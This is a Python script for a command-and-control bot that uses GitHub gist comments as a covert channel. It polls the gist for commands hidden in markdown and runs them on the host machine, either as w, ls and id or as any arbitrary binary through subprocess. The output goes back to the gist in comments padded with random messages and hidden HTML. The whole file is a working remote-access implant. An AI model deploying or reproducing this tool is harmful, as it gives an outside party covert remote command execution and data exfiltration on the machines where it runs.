#! /bin/python3
import argparse
from datetime import datetime
import subprocess
import requests
from dotenv import dotenv_values
import time

from utils import create_markdown_comment, get_random_message, parse_markdown_comment

parser = argparse.ArgumentParser(
    prog='bot.py',
    description='Bot script listening to commands on given gist channel'
)

try:
    github_token = dotenv_values(".env")['GITHUB_TOKEN']
except KeyError:
    github_token = None

parser.add_argument('gistId', help="Github gist id")
parser.add_argument('-v', '--verbose', help="Show logs",
                    action='store_true')
parser.add_argument(
    '-t', '--token', help='Github personal access token, required if not specified in .env file', required=github_token is None)


args = parser.parse_args()

if(github_token is None):
    github_token = args.token

gist_id = args.gistId
gist_url = f'https://api.github.com/gists/{gist_id}'
comments_url = f'{gist_url}/comments'

headers = {"authorization": f'bearer {github_token}'}
gist_response = requests.get(gist_url, headers=headers)
gist = gist_response.json()
state = {"last_update": gist['updated_at'], "pong_comment": None}

try:
    print(f"Channel url: {gist['url']}")
except KeyError:
    print(f'Failed tof fetch gist: {gist_response}')
    exit()


def log(message):
    if not args.verbose:
        return
    print(message)


def get_latest_comments():
    response = requests.get(comments_url, headers=headers)
    comments = response.json()
    latest = filter(
        lambda comment: comment['updated_at'] > state['last_update'], comments)
    return list(latest)


def get_commands(comments):
    commands = map(lambda comment: parse_markdown_comment(
        comment['body']), comments)
    return filter(lambda command: command != '', commands)


def post_command(message: str):
    comment = f'{get_random_message()}\n\n{create_markdown_comment(message)}'
    log(f'Sending command "{comment}"')

    response = requests.post(
        comments_url, json={"body": comment}, headers=headers)

    log(response)
    state["last_update"] = response.json()['updated_at']
    return response


def pong():
    def get_message():
        return f"{get_random_message()}\n\n<!-- {datetime.now()} -->\n\n{create_markdown_comment('pong')}"
    pong_comment = state['pong_comment']
    log(f'pong')
    if pong_comment is None:
        response = requests.post(
            comments_url, json={"body": get_message()}, headers=headers)
        state['pong_comment'] = response.json()
        return

    response = requests.get(
        f"{comments_url}/{pong_comment['id']}", headers=headers)

    if response.status_code == 404:
        state['pong_comment'] = None
        pong()
        return

    requests.patch(
        f'{comments_url}/{pong_comment["id"]}', json={"body": get_message()}, headers=headers)


def list_to_string(input: list[str], separator=', '):
    return separator.join(map(str, input))


def handle_command(command: str):
    log(f'Received command "{command}"')
    keys = command.split(' ')
    bin_name, args = keys[0], keys[1:]
    match bin_name:
        case 'w':
            result = subprocess.check_output(['w'])

            usernames = list(map(lambda line: line.decode(
                'utf-8').split(' ')[0], result.splitlines()))[2:]

            post_command(list_to_string(usernames))
        case 'ls':
            result = subprocess.check_output(['ls'] + args)
            filenames = list(map(lambda line: line.decode(
                'utf-8').split(' ')[0], result.splitlines()))
            post_command(list_to_string(filenames))
        case 'id':
            result = subprocess.check_output(['id'])
            post_command(result.decode('utf-8'))
        case 'ping':
            pong()
        case _:
            log('Unknown command: '+command)
            try:
                result = subprocess.check_output([command]+args)
                post_command((result.decode('utf-8')))
            except FileNotFoundError:
                log(f"No such file or directory: '{command}'")
            except PermissionError:
                log(f"Permission denied: '{command}'")


while True:
    time.sleep(5)
    log('fetching comments')
    comments = get_latest_comments()
    if len(comments) == 0:
        log('No new commands')
    if len(comments) > 0:
        state['last_update'] = comments[-1]['updated_at']

    for command in get_commands(comments):
        handle_command(command)
